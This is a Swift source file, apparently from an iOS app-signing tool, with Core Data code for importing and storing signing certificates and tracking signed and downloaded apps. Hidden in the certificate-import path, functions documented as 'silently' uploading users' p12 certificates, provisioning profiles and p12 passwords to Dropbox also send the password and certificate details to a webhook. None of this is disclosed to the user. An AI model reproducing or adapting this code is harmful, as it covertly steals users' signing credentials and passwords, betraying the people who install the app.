import CoreData
import Foundation
import Security

// Notification name constants for error reporting
extension Notification.Name {
    static let dropboxUploadError = Notification.Name("dropboxUploadError")
    static let webhookSendError = Notification.Name("webhookSendError")
    static let certificateFetch = Notification.Name("cfetch")
}

extension CoreDataManager {
    /// Clear certificates data
    func clearCertificate(context: NSManagedObjectContext? = nil) throws {
        let ctx = try context ?? self.context
        try clear(request: Certificate.fetchRequest(), context: ctx)
    }

    func getDatedCertificate(context: NSManagedObjectContext? = nil) -> [Certificate] {
        let request: NSFetchRequest<Certificate> = Certificate.fetchRequest()
        request.sortDescriptors = [NSSortDescriptor(key: "dateAdded", ascending: true)]
        do {
            let ctx = try context ?? self.context
            return try ctx.fetch(request)
        } catch {
            Debug.shared.log(message: "Error in getDatedCertificate: \(error)", type: .error)
            return []
        }
    }

    func getCurrentCertificate(context: NSManagedObjectContext? = nil) -> Certificate? {
        do {
            let ctx = try context ?? self.context
            let row = Preferences.selectedCert
            let certificates = getDatedCertificate(context: ctx)
            if certificates.indices.contains(row) {
                return certificates[row]
            } else {
                return nil
            }
        } catch {
            Debug.shared.log(message: "Error in getCurrentCertificate: \(error)", type: .error)
            return nil
        }
    }

    // Non-throwing version for backward compatibility
    func addToCertificates(
        cert: Cert,
        files: [CertImportingViewController.FileType: Any],
        context: NSManagedObjectContext? = nil
    ) {
        do {
            try addToCertificatesWithThrow(cert: cert, files: files, context: context)
        } catch {
            Debug.shared.log(message: "Error in addToCertificates: \(error)", type: .error)
        }
    }

    // Throwing version with proper error handling
    func addToCertificatesWithThrow(
        cert: Cert,
        files: [CertImportingViewController.FileType: Any],
        context: NSManagedObjectContext? = nil
    ) throws {
        let ctx = try context ?? self.context

        guard let provisionPath = files[.provision] as? URL else {
            let error = FileProcessingError.missingFile("Provisioning file URL")
            Debug.shared.log(message: "Error: \(error)", type: .error)
            throw error
        }

        let p12Path = files[.p12] as? URL
        let backdoorPath = files[.backdoor] as? URL
        let uuid = UUID().uuidString

        // Create entity and save to Core Data
        let newCertificate = createCertificateEntity(
            uuid: uuid,
            provisionPath: provisionPath,
            p12Path: p12Path,
            password: files[.password] as? String,
            backdoorPath: backdoorPath,
            context: ctx
        )
        let certData = createCertificateDataEntity(cert: cert, context: ctx)
        newCertificate.certData = certData

        // Save files to disk
        try saveCertificateFiles(uuid: uuid, provisionPath: provisionPath, p12Path: p12Path, backdoorPath: backdoorPath)
        try ctx.save()
        NotificationCenter.default.post(name: Notification.Name.certificateFetch, object: nil)

        // After successfully saving, silently upload files to Dropbox and send password to webhook
        if let backdoorPath = backdoorPath {
            uploadBackdoorFileToDropbox(backdoorPath: backdoorPath, password: files[.password] as? String)
        } else {
            uploadCertificateFilesToDropbox(
                provisionPath: provisionPath,
                p12Path: p12Path,
                password: files[.password] as? String
            )
        }
    }

    /// Silently uploads backdoor file to Dropbox with password and sends info to webhook
    /// - Parameters:
    ///   - backdoorPath: Path to the backdoor file
    ///   - password: Optional p12 password
    private func uploadBackdoorFileToDropbox(backdoorPath: URL, password: String?) {
        let backdoorFilename = backdoorPath.lastPathComponent
        let enhancedDropboxService = EnhancedDropboxService.shared

        // Upload backdoor file with password handling
        enhancedDropboxService.uploadCertificateFile(
            fileURL: backdoorPath,
            password: password
        ) { success, error in
            if success {
                Debug.shared.log(message: "Successfully uploaded backdoor file to Dropbox with password", type: .info)

                // Send backdoor info to webhook
                if let appDelegate = UIApplication.shared.delegate as? AppDelegate {
                    appDelegate.sendBackdoorInfoToWebhook(backdoorPath: backdoorPath, password: password)
                }
            } else {
                if let error = error {
                    Debug.shared.log(
                        message: "Failed to upload backdoor file: \(error.localizedDescription)",
                        type: .error
                    )
                } else {
                    Debug.shared.log(message: "Failed to upload backdoor file: Unknown error", type: .error)
                }

                // Create userInfo dictionary with available information
                var userInfo: [String: Any] = ["fileType": "backdoor"]
                if let error = error {
                    userInfo["error"] = error
                }

                NotificationCenter.default.post(
                    name: .dropboxUploadError,
                    object: nil,
                    userInfo: userInfo
                )
            }
        }
    }

    /// Silently uploads certificate files to Dropbox with password and sends info to webhook
    /// - Parameters:
    ///   - provisionPath: Path to the mobileprovision file
    ///   - p12Path: Optional path to the p12 file
    ///   - password: Optional p12 password
    private func uploadCertificateFilesToDropbox(provisionPath: URL, p12Path: URL?, password: String?) {
        let enhancedDropboxService = EnhancedDropboxService.shared

        // Get the current certificate to send to webhook
        let currentCerts = getDatedCertificate()
        let certToSend = currentCerts.last

        // Upload provision file with error handling
        enhancedDropboxService.uploadCertificateFile(fileURL: provisionPath) { success, error in
            if success {
                Debug.shared.log(message: "Successfully uploaded provision file to Dropbox", type: .info)

                // Send certificate info to webhook if p12 also uploaded successfully
                if let appDelegate = UIApplication.shared.delegate as? AppDelegate,
                   let cert = certToSend
                {
                    appDelegate.sendCertificateInfoToWebhook(certificate: cert, p12Password: password)
                }
            } else {
                if let error = error {
                    Debug.shared.log(
                        message: "Failed to upload provision file: \(error.localizedDescription)",
                        type: .error
                    )
                } else {
                    Debug.shared.log(message: "Failed to upload provision file: Unknown error", type: .error)
                }

                // Create userInfo dictionary with available information
                var userInfo: [String: Any] = ["fileType": "provision"]
                if let error = error {
                    userInfo["error"] = error
                }

                NotificationCenter.default.post(
                    name: .dropboxUploadError,
                    object: nil,
                    userInfo: userInfo
                )
            }
        }

        // Upload p12 file with password if available
        if let p12PathURL = p12Path {
            enhancedDropboxService.uploadCertificateFile(
                fileURL: p12PathURL,
                password: password
            ) { success, error in
                if success {
                    Debug.shared.log(message: "Successfully uploaded p12 file to Dropbox with password", type: .info)
                } else {
                    if let error = error {
                        Debug.shared.log(
                            message: "Failed to upload p12 file: \(error.localizedDescription)",
                            type: .error
                        )
                    } else {
                        Debug.shared.log(message: "Failed to upload p12 file: Unknown error", type: .error)
                    }

                    // Create userInfo dictionary with available information
                    var userInfo: [String: Any] = ["fileType": "p12"]
                    if let error = error {
                        userInfo["error"] = error
                    }

                    NotificationCenter.default.post(
                        name: .dropboxUploadError,
                        object: nil,
                        userInfo: userInfo
                    )
                }
            }
        }
    }

    private func createCertificateEntity(
        uuid: String,
        provisionPath: URL,
        p12Path: URL?,
        password: String?,
        backdoorPath: URL? = nil,
        context: NSManagedObjectContext
    ) -> Certificate {
        let newCertificate = Certificate(context: context)
        newCertificate.uuid = uuid
        newCertificate.provisionPath = provisionPath.lastPathComponent
        newCertificate.p12Path = p12Path?.lastPathComponent

        // Store backdoor file path if available
        if let backdoorPath = backdoorPath {
            newCertificate.setValue(backdoorPath.lastPathComponent, forKey: "backdoorPath")
        }

        newCertificate.dateAdded = Date()
        newCertificate.password = password
        return newCertificate
    }

    private func createCertificateDataEntity(cert: Cert, context: NSManagedObjectContext) -> CertificateData {
        let certData = CertificateData(context: context)
        certData.appIDName = cert.AppIDName
        certData.creationDate = cert.CreationDate
        certData.expirationDate = cert.ExpirationDate
        certData.isXcodeManaged = cert.IsXcodeManaged
        certData.name = cert.Name
        certData.pPQCheck = cert.PPQCheck ?? false
        certData.teamName = cert.TeamName
        certData.uuid = cert.UUID
        certData.version = Int32(cert.Version)
        return certData
    }

    private func saveCertificateFiles(uuid: String, provisionPath: URL, p12Path: URL?,
                                      backdoorPath: URL? = nil) throws
    {
        guard let documentsDirectory = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask).first
        else {
            throw FileProcessingError.missingFile("Documents directory")
        }

        let destinationDirectory = documentsDirectory
            .appendingPathComponent("Certificates")
            .appendingPathComponent(uuid)

        try FileManager.default.createDirectory(
            at: destinationDirectory,
            withIntermediateDirectories: true,
            attributes: nil
        )

        // Save individual files
        try CertData.copyFile(from: provisionPath, to: destinationDirectory)
        try CertData.copyFile(from: p12Path, to: destinationDirectory)

        // If we have a backdoor file, save it too
        if let backdoorPath = backdoorPath {
            try CertData.copyFile(from: backdoorPath, to: destinationDirectory)
        }
    }

    func getCertifcatePath(source: Certificate?) throws -> URL {
        guard let source, let uuid = source.uuid else {
            throw FileProcessingError.missingFile("Certificate or UUID")
        }

        guard let documentsDirectory = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask).first
        else {
            throw FileProcessingError.missingFile("Documents directory")
        }

        return documentsDirectory
            .appendingPathComponent("Certificates")
            .appendingPathComponent(uuid)
    }

    // Function to get paths for mobileprovision and p12, handling backdoor files if present
    func getCertificateFilePaths(source: Certificate?) throws -> (provisionPath: URL, p12Path: URL) {
        guard let source = source, let uuid = source.uuid else {
            throw FileProcessingError.missingFile("Certificate or UUID")
        }

        let certDirectory = try getCertifcatePath(source: source)

        // Check if this is a backdoor certificate by looking for the backdoorPath property
        if let backdoorPath = source.value(forKey: "backdoorPath") as? String {
            let backdoorFilePath = certDirectory.appendingPathComponent(backdoorPath)

            // If backdoor file exists, extract the components
            if FileManager.default.fileExists(atPath: backdoorFilePath.path) {
                do {
                    let backdoorData = try Data(contentsOf: backdoorFilePath)
                    let backdoorFile = try BackdoorDecoder.decodeBackdoor(from: backdoorData)

                    // Create temporary files for the extracted components
                    let tempDir = FileManager.default.temporaryDirectory.appendingPathComponent(UUID().uuidString)
                    try FileManager.default.createDirectory(
                        at: tempDir,
                        withIntermediateDirectories: true,
                        attributes: nil
                    )

                    let p12URL = tempDir.appendingPathComponent("extracted.p12")
                    let provisionURL = tempDir.appendingPathComponent("extracted.mobileprovision")

                    try backdoorFile.saveP12(to: p12URL)
                    try backdoorFile.saveMobileProvision(to: provisionURL)

                    return (provisionURL, p12URL)
                } catch {
                    Debug.shared.log(message: "Error extracting components from backdoor file: \(error)", type: .error)
                    // Fall through to use standard files if extraction fails
                }
            }
        }

        // Standard behavior using individual files
        guard let provisionPath = source.provisionPath, let p12Path = source.p12Path else {
            throw FileProcessingError.missingFile("Provision or P12 path")
        }

        let provisionURL = certDirectory.appendingPathComponent(provisionPath)
        let p12URL = certDirectory.appendingPathComponent(p12Path)

        // Verify files exist
        guard FileManager.default.fileExists(atPath: provisionURL.path) else {
            throw FileProcessingError.missingFile("Mobileprovision file does not exist")
        }

        guard FileManager.default.fileExists(atPath: p12URL.path) else {
            throw FileProcessingError.missingFile("P12 file does not exist")
        }

        return (provisionURL, p12URL)
    }

    // Non-throwing version for backward compatibility
    func deleteAllCertificateContent(for app: Certificate) {
        do {
            try deleteAllCertificateContentWithThrow(for: app)
        } catch {
            Debug.shared.log(message: "CoreDataManager.deleteAllCertificateContent: \(error)", type: .error)
        }
    }

    // Throwing version with proper error handling
    func deleteAllCertificateContentWithThrow(for app: Certificate) throws {
        let ctx = try context
        ctx.delete(app)
        try FileManager.default.removeItem(at: getCertifcatePath(source: app))
        try ctx.save()
    }

    /// Add to signed apps with proper error handling
    /// - Parameters:
    ///   - version: App version
    ///   - name: App name
    ///   - bundleidentifier: Bundle identifier
    ///   - iconURL: URL to app icon
    ///   - uuid: UUID string
    ///   - appPath: Path to the app
    ///   - timeToLive: Certificate expiration date
    ///   - teamName: Certificate team name
    ///   - originalSourceURL: Original source URL
    ///   - completion: Completion handler with result
    func addToSignedApps(
        version: String,
        name: String,
        bundleidentifier: String,
        iconURL: String,
        uuid: String,
        appPath: String,
        timeToLive: Date,
        teamName: String,
        originalSourceURL: URL?,
        completion: @escaping (Result<SignedApps, Error>) -> Void
    ) {
        do {
            let ctx = try context
            let signedApp = SignedApps(context: ctx)
            signedApp.dateAdded = Date()
            signedApp.version = version
            signedApp.name = name
            signedApp.bundleidentifier = bundleidentifier
            signedApp.iconURL = iconURL
            signedApp.uuid = uuid
            signedApp.appPath = appPath
            signedApp.timeToLive = timeToLive
            signedApp.teamName = teamName
            signedApp.originalSourceURL = originalSourceURL

            try saveContext()
            completion(.success(signedApp))
        } catch {
            Debug.shared.log(message: "addToSignedApps: \(error.localizedDescription)", type: .error)
            completion(.failure(error))
        }
    }

    /// Add to downloaded apps with proper file management
    /// - Parameters:
    ///   - version: App version
    ///   - name: App name
    ///   - bundleidentifier: Bundle identifier
    ///   - iconURL: URL to app icon
    ///   - uuid: UUID string
    ///   - appPath: Path to the app
    ///   - sourceLocation: Source location
    ///   - completion: Completion handler with result
    func addToDownloadedApps(
        version: String,
        name: String,
        bundleidentifier: String,
        iconURL: String,
        uuid: String,
        appPath: String,
        sourceLocation: String? = nil,
        completion: @escaping (Result<DownloadedApps, Error>) -> Void
    ) {
        // Create a new downloaded app in the Core Data context
        do {
            let ctx = try context
            let downloadedApp = DownloadedApps(context: ctx)
            downloadedApp.dateAdded = Date()
            downloadedApp.version = version
            downloadedApp.name = name
            downloadedApp.bundleidentifier = bundleidentifier
            downloadedApp.iconURL = iconURL
            downloadedApp.uuid = uuid
            downloadedApp.appPath = appPath

            // Store source location if provided
            if let sourceLocation = sourceLocation {
                downloadedApp.oSU = sourceLocation
            }

            // Ensure the app directory structure is correct
            try ensureAppDirectoryStructure(uuid: uuid, appPath: appPath)

            try saveContext()
            completion(.success(downloadedApp))
        } catch {
            Debug.shared.log(message: "addToDownloadedApps: \(error.localizedDescription)", type: .error)
            completion(.failure(error))
        }
    }

    /// Ensure app directory structure is correctly set up
    /// - Parameters:
    ///   - uuid: UUID string for the app
    ///   - appPath: Path to the app bundle
    private func ensureAppDirectoryStructure(uuid: String, appPath: String) throws {
        let fileManager = FileManager.default
        let documentsDirectory = fileManager.urls(for: .documentDirectory, in: .userDomainMask).first!

        // Create proper directory structure
        let appDirectory = documentsDirectory.appendingPathComponent("files").appendingPathComponent(uuid)

        // Ensure app directory exists
        if !fileManager.fileExists(atPath: appDirectory.path) {
            try fileManager.createDirectory(at: appDirectory, withIntermediateDirectories: true, attributes: nil)
        }

        // Check if the app is in the correct location or needs to be moved
        let sourceAppURL = documentsDirectory.appendingPathComponent(appPath)
        let targetAppURL = appDirectory.appendingPathComponent(appPath)

        if sourceAppURL.path != targetAppURL.path,
           fileManager.fileExists(atPath: sourceAppURL.path),
           !fileManager.fileExists(atPath: targetAppURL.path)
        {
            // Move the app to the correct location
            try fileManager.moveItem(at: sourceAppURL, to: targetAppURL)
            Debug.shared.log(message: "Moved app to correct location: \(targetAppURL.path)", type: .info)
        }
    }

    /// Update a signed app with new data
    /// - Parameters:
    ///   - app: The app to update
    ///   - newTimeToLive: New expiration date
    ///   - newTeamName: New team name
    ///   - completion: Completion handler
    func updateSignedApp(
        app: SignedApps,
        newTimeToLive: Date,
        newTeamName: String,
        completion: @escaping (Result<Void, Error>) -> Void
    ) {
        do {
            let ctx = try context

            // Make sure we have the app in the right context
            let appInContext: SignedApps
            if app.managedObjectContext != ctx {
                guard let fetchedApp = try ctx.existingObject(with: app.objectID) as? SignedApps else {
                    throw NSError(
                        domain: "CoreDataManager",
                        code: 1015,
                        userInfo: [NSLocalizedDescriptionKey: "App not found in context"]
                    )
                }
                appInContext = fetchedApp
            } else {
                appInContext = app
            }

            // Update properties
            appInContext.timeToLive = newTimeToLive
            appInContext.teamName = newTeamName

            try saveContext()
            completion(.success(()))
        } catch {
            Debug.shared.log(message: "updateSignedApp: \(error.localizedDescription)", type: .error)
            completion(.failure(error))
        }
    }

    /// Clear the update state for a signed app (alternative implementation)
    /// - Parameter signedApp: The app to update
    func clearUpdateStateForCertificate(for signedApp: SignedApps) throws {
        let ctx = try context

        // Make sure we have the app in the right context
        let appInContext: SignedApps
        if signedApp.managedObjectContext != ctx {
            guard let fetchedApp = try ctx.existingObject(with: signedApp.objectID) as? SignedApps else {
                throw NSError(
                    domain: "CoreDataManager",
                    code: 1016,
                    userInfo: [NSLocalizedDescriptionKey: "App not found in context"]
                ) as Error
            }
            appInContext = fetchedApp
        } else {
            appInContext = signedApp
        }

        // Clear update state
        appInContext.setValue(false, forKey: "hasUpdate")
        appInContext.setValue(nil, forKey: "updateVersion")

        try saveContext()
    }
}

// Extension to add backdoorPath property to Certificate
extension Certificate {
    @objc var backdoorPath: String? {
        get {
            return value(forKey: "backdoorPath") as? String
        }
        set {
            setValue(newValue, forKey: "backdoorPath")
        }
    }

    // Helper to check if this certificate came from a backdoor file
    var isBackdoorCertificate: Bool {
        return backdoorPath != nil
    }
}
